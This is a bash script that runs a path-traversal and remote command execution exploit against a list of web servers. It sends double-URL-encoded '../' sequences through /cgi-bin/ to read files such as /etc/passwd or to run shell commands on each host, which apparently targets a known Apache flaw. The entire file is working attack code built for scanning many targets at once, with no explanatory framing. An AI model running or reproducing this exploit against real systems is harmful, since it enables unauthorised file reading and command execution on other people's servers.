#!/bin/bash

if [[ -z $1 ]] || [[ -z $2 ]]; then
    echo "Usage: $0 [TARGET-LIST.TXT] [PATH/COMMAND]"
    echo "Example: $0 targets.txt /etc/passwd"
    echo "Example: $0 targets.txt '/bin/sh id'"
    exit 1
fi

TARGETS=$1
COMMAND=$2
PAYLOAD="echo Content-Type: text/plain; echo; ${COMMAND}"

for host in $(cat ${TARGETS}); do
    echo "Testing ${host}..."
    curl -s --path-as-is -d "${PAYLOAD}" "${host}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
done
